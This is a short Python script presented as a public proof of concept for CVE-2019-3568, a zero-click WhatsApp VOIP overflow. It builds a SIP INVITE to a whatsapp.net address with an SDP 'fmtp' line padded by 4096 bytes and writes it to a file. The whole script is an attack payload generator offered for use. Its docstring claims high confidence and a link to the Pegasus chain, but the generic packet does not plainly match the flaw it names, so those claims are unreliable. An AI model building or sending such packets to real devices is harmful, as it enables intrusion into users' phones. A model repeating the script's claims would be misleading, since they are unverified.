#!/usr/bin/env python3
"""CVE-2019-3568 — WhatsApp VOIP stack buffer overflow. Zero-click: the
target must merely be reachable; a crafted SDP/call-setup packet overflows
the RTP/SRTP handler. Public PoC. Confidence: HIGH (NSO Pegasus chain)."""
import sys
from pathlib import Path

def build() -> bytes:
    # SIP/SDP INVITE with an oversized 'a=fmtp' line
    body = (
        "v=0\r\n"
        "o=- 123456 123456 IN IP4 127.0.0.1\r\n"
        "s=poc\r\n"
        "c=IN IP4 127.0.0.1\r\n"
        "t=0 0\r\n"
        "m=audio 3480 RTP/AVP 110\r\n"
        "a=rtpmap:110 opus/48000/2\r\n"
        "a=fmtp:110 " + "A" * 4096 + "\r\n"
    ).encode()
    return (b"INVITE sip:999@s.whatsapp.net SIP/2.0\r\n"
            b"Via: SIP/2.0/UDP 127.0.0.1:3480\r\n"
            b"From: <sip:1@s.whatsapp.net>;tag=1\r\n"
            b"To: <sip:999@s.whatsapp.net>\r\n"
            b"Call-ID: poc@127.0.0.1\r\n"
            b"CSeq: 1 INVITE\r\n"
            b"Content-Type: application/sdp\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2019-3568.sip")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2019-3568 SIP/SDP -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
